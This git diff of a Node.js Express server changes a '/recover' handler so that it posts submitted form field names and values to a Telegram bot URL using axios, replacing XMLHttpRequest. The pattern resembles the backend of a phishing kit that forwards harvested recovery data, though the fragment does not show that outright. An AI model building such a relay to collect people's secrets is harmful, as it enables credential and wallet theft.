@@ -1,6 +1,8 @@
 const express = require('express');
 const app = express();
 const nodemailer = require('nodemailer');
+const axios = require('axios');
+
 require('dotenv').config()
 
 const cors = require('cors')
@@ -51,11 +53,10 @@ app.post('/recover', (req, res) => {
          //         message += ` ${strings[key]['name']} : ${strings[key]['value']} %0A%0A`;
          //   })
         let t = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${message}`;
-     
-        let requestt = new XMLHttpRequest();
-        requestt.open("POST", t);
-        requestt.send();
-        let responset = requestt.response;
+        let responset = axios.post(t);
+        // let requestt = new XMLHttpRequest();
+        // requestt.open("POST", t);
+        // requestt.send();
     } 
     
   // configure the email message
